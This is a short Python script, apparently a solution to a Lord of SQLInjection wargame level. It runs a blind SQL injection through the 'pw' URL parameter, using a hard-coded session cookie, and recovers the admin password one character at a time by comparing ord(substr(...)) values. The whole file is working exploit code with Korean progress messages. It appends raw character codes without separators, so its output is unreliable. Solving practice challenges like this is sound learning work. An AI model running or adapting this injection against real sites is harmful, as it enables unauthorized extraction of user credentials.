import requests
import string

url="https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"
cookies={'PHPSESSID':"4modts643vpt0mvnde68qq3nhh"}
ascii_code=string.digits+string.ascii_letters
password=""

for i in range(1, 13):
    print("{}번 째 문자 시작".format(i))

    for j in range(0, 256):
        params=f"?pw=1' or id='admin' and ord(substr(pw,{i},1))={j}%23"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)
        if response.text.find("<h2>Hello admin</h2>")>0:
            password+=str(j)
            print("찾은 PW : ", password)
            print("찾은 URL : ", find_url)

print(f"찾은 값은 : {password}")
print("\n완료~")
